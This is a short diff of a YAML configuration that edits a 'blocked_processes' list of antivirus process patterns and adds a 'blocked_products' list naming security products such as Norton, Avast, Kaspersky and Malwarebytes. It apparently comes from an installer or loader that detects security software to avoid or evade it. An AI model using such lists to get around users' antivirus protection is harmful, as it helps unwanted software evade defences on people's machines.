@@ -1,6 +1,6 @@
 blocked_processes:
-  - "*rav*"
-  - "*reasonlabs*"
+  - "prod0.exe"
+  - "*unified*"
   - "*360*"
   - "*360ts*"
   - "*360safe*"
@@ -28,3 +28,13 @@ blocked_processes:
   - "*drweb*"
   - "*emsisoft*"
   - "*vipre*"
+
+blocked_products:
+  - "*ReasonLabs Setup Wizard*"
+  - "*360 Total Security*"
+  - "*Norton*"
+  - "*Avast*"
+  - "*AVG AntiVirus*"
+  - "*Kaspersky*"
+  - "*Malwarebytes*"
+  - "*McAfee*"
